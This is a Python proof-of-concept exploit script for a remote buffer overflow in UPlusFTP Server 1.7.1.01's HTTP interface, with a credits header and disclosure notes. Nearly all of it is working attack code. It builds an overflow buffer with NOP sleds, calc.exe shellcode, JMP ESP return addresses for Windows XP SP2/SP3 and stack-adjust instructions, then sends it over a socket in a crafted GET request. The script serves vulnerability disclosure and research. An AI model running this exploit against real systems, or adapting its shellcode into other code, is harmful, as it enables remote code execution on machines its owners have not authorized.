#!/usr/bin/python
import socket,sys,base64

print """
#
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	UPlusFTP Server v1.7.1.01 [ HTTP ] Remote BoF Exploit PoC
	Discovered by : Karn Ganeshen		   		   		   
	Author : Karn Ganeshen / corelanc0d3r
						   						   
	KarnGaneshen [aT] gmail [d0t] com 				   		   
	http://ipositivesecurity.blogspot.com
								   			   
	Greetz out to: 	corelanc0d3r
					http://corelan.be:8800/index.php
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#
"""

# Tested on XP Pro SP2 [ Eng ] and XP Pro SP3 [ Eng ]
# Date Found : July 21, 2010
# Vendor notified on July 23, 2010
# Issue fixed and new version 1.7.1.02 released on July 23, 2010

if len(sys.argv) != 5:
    print "Usage: ./poc.py <Target IP> <Port> <User> <Password>"
    sys.exit(1)
 
target = sys.argv[1]
port = int(sys.argv[2])
user = sys.argv[3]
pwd = sys.argv[4]

auth = base64.b64encode(user+":"+pwd)

buf="A"*1963
buf+="\x90"*179

# 165 bytes Calc.exe shellcode / badchars identified and excluded
buf+=("\xd9\xca\x29\xc9\xb1\x24\xbf\x3f\xc7\x66\x9f\xd9\x74\x24\xf4\x5e"
"\x31\x7e\x17\x03\x7e\x17\x83\xf9\xc3\x84\x6a\xf9\x24\x0c\x95\x01"
"\xb5\x06\xd0\x3d\x3e\x64\xde\x45\x41\x7a\x6b\xfa\x59\x0f\x33\x24"
"\x5b\xe4\x85\xaf\x6f\x71\x14\x41\xbe\x45\x8e\x31\x45\x85\xc5\x4e"
"\x87\xcc\x2b\x51\xc5\x3a\xc7\x6a\x9d\x98\x2c\xf9\xf8\x6a\x73\x25"
"\x02\x86\xea\xae\x08\x13\x78\xef\x0c\xa2\x95\x84\x31\x2f\x68\x71"
"\xc0\x73\x4f\x81\x10\xba\x4f\xed\x1d\xfd\x7f\x68\xe1\x86\x73\xf9"
"\xa2\x7a\x07\x8d\x3e\x2e\x9c\x05\x37\xdb\xaa\x5e\xc7\xab\xad\x60"
"\xc8\x40\xc5\x5c\x97\x67\xe0\xfc\x71\x01\xf4\x7f\xbd\x6a\x55\x17"
"\xce\x07\x51\xb8\x46\x80\xa4\xcc\x99\xe7\xa7\x37\xc6\x66\x34\xd4"
"\x27\x0c\xbc\x7f\x38")

buf+="\x90"*15

#[ XP SP2 ] -> "\x78\x16\xF3\x77"	#0x77F31678  JMP ESP
buf+="\x78\x16\xF3\x77"

#[ XP SP3 ] -> "\x3F\x71\x49\x7E"   #0x7E49713F  JMP ESP
#buf+="\x3F\x71\x49\x7E"

buf+="\x90"*30
buf+="\x66\x05\x7A\x03"      	#ADD AX,037A
buf+="\x66\x05\x7A\x03"      	#ADD AX,037A
buf+="\x66\x05\x7A\x03"      	#ADD AX,037A
buf+="\x50\xc3"             	#PUSH EAX + RET

print "[+] Launching exploit against " + target + "..."

head = "GET /list.html?path="+buf+" HTTP/1.1 \r\n"
head += "Host: \r\n"
head += "Authorization: Basic "+auth+"\r\n"
 
try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((target, port))
	s.send(head + "\r\n")
	print "[!] Payload sent..."
	s.close()
except:
	print "[x] Error!"